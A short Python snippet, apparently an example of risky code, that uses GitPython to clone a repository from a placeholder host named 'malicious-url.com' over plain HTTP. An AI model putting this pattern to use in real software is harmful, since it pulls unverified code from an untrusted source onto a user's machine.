import git

def clone_repository(repo_url, destination):
    git.Repo.clone_from(repo_url, destination)

clone_repository("http://malicious-url.com/repo.git", "/path/to/destination")